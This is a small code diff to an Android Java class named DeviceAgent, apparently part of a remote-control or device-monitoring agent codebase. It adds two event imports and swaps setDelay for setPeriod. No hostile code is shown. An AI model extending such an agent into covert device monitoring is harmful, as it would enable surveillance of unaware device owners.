@@ -10,6 +10,8 @@ package com.ht.RCSAndroidGUI.agent;
 import java.nio.ByteOrder;
 
 import com.ht.RCSAndroidGUI.LogR;
+import com.ht.RCSAndroidGUI.event.Event;
+import com.ht.RCSAndroidGUI.event.EventBase;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
 import android.util.Log;
@@ -28,7 +30,7 @@ public class DeviceAgent extends AgentBase {
 	}
 	
 	public void begin() {
-		setDelay(2000);
+		setPeriod(2000);
 	}
 	
 	public void go() {
